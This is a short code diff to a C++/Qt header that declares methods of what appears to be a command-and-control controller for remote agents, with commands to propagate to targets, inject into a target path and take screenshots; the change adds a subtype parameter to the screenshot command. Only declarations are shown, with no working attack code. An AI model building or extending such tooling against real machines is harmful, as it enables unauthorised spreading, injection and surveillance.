@@ -37,7 +37,7 @@ public:
     void disconnectAgent(const QString& ip);
     void sendPropagationCommand(const QString& ip, uint8_t cmd, const QString& target);
     void sendInjectCommand(const QString& ip, const QString& targetPath);
-    void sendScreenshotCommand(const QString& ip);
+    void sendScreenshotCommand(const QString& ip, uint8_t subtype = 1);
 
     // Getters
     [[nodiscard]] bool     isRunning() const;
